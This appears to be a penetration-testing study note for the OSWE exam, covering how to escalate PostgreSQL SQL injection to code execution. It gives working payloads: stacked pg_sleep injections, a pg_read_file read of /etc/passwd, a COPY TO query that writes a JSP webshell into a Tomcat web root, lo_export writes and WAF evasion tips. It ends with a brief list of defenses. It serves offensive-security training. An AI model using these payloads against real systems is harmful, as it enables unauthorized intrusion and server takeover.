# PostgreSQL SQLi → RCE Methodology

**Goal**: Move from confirmed SQL injection on **PostgreSQL** to file read/write and code execution on OSWE-style Java/PHP stacks.

**Companions**: `notes/MANAGEENGINE-APPS-MANAGER-SQLI-RCE.md`, `poc-examples/manageengine-sqli/`, `guides/Advanced-SQLi-Techniques.md`, `guides/Blind-SQLi-Automation.md`.

---

## 1. Why Postgres is different

MySQL reflexes (`INTO OUTFILE`, `LOAD_FILE`, `xp_cmdshell`) do **not** map 1:1.

| Goal | PostgreSQL directions |
|------|------------------------|
| Time blind | `pg_sleep(n)`, `SELECT CASE WHEN ... THEN pg_sleep(n) END` |
| File read | `pg_read_file`, `pg_ls_dir` (role-dependent) |
| File write | `COPY ... TO`, large objects (`lo_*`) |
| Command exec | Not built-in like xp_cmdshell; achieve via **write webshell** / extensions / UDFs |

On app servers colocated with DB (common in appliances), **webshell write** is the standard RCE path.

---

## 2. Preconditions checklist

- [ ] SQLi confirmed (error / boolean / time / stacked)  
- [ ] Stacked queries work **or** single-statement primitives suffice  
- [ ] DB user privileges known (`current_user`, superuser?)  
- [ ] App language/container known (Tomcat → JSP; PHP → `.php`)  
- [ ] Writable path under web root guessed or read from config  

---

## 3. Privilege & environment recon

```sql
SELECT version();
SELECT current_user, session_user;
SELECT current_database();
SELECT usesuper FROM pg_user WHERE usename = current_user;
SHOW data_directory;
```

Blind: extract with binary search (see Blind SQLi guide).

File recon (if permitted):

```sql
SELECT pg_ls_dir('/opt');
SELECT pg_read_file('/etc/passwd', 0, 1000);
```

---

## 4. Injection mechanics notes

### Stacked queries

Many JDBC paths allow:

```sql
1; SELECT pg_sleep(5);--
```

Some only allow subquery context — adapt.

### String escaping

Match how the app builds SQL (single quotes, dollar quoting `$$`).

### Encoding

URL-encode carefully in Python PoCs; prefer parameterized stage builders that encode once.

---

## 5. RCE / write primitives

### A. COPY TO (classic)

```sql
COPY (SELECT '<% Runtime.getRuntime().exec(request.getParameter("c")); %>')
TO '/opt/app/tomcat/webapps/ROOT/s.jsp';
```

Requirements: sufficient privileges; path writable by postgres OS user; path served by HTTP.

### B. Large objects

1. Create LO, write bytes of webshell  
2. `lo_export(loid, '/path/shell.jsp')`  

Useful for binary-safe content and larger payloads.

### C. Read configs to find web root

Parse application config via `pg_read_file` to avoid guessing paths.

### D. Extensions / UDF (advanced)

Less common under exam time pressure; prefer COPY/LO + webshell.

---

## 6. Choosing webshell language

| Stack | Prefer |
|-------|--------|
| Tomcat / Java EE | **JSP** / servlet |
| PHP app + Postgres | PHP webshell |
| IIS rare with PG | ASPX if applicable |

**Mismatch kills chains** (PHP file on pure Tomcat).

---

## 7. End-to-end chain

```text
1. Time-based confirm pg_sleep
2. Extract user/superuser/version
3. Locate web root (read files / guess appliance paths)
4. Write marker file; fetch via HTTP
5. Write webshell; execute command
6. Script all stages non-interactively
```

---

## 8. PoC stage design

```text
recon_delay()
check_superuser()
extract_string(query)
find_webroot()
write_shell()
verify_http()
optional_reverse_shell()
```

Reuse binary search module from `guides/Blind-SQLi-Automation.md`.

---

## 9. Operational pitfalls

| Pitfall | Fix |
|---------|-----|
| MySQL payloads on PG | Rewrite for `pg_sleep`, `COPY` |
| Postgres user cannot write web root | Find other writable mapped dirs; different primitive |
| COPY path wrong OS user view | Paths are DB host filesystem |
| WAF | Comment styles, case, alternative whitespace |
| Destructive tests | Snapshot; avoid dropping tables |

---

## 10. Defenses

1. Parameterized queries only  
2. App DB role: no superuser, no filesystem roles  
3. Separate DB host from app; FS permissions prevent webroot writes  
4. Disable unused dangerous privileges  
5. Input validation secondary to parameterization  

---

## 11. OSWE tactics

- Appliances (ManageEngine-class): **unauth servlet + PG** is a pattern — decompile servlets early.  
- Spend time on **path discovery** once write works for marker files.  
- In-band command output via webshell beats reverse shell when egress is blocked.  
- Document exact SQL in notes; scrub for report policy as required.  

**Quick sleep payloads**

```sql
SELECT pg_sleep(5);
SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;
```

**Related**: ManageEngine notes/PoC, Advanced SQLi guide.
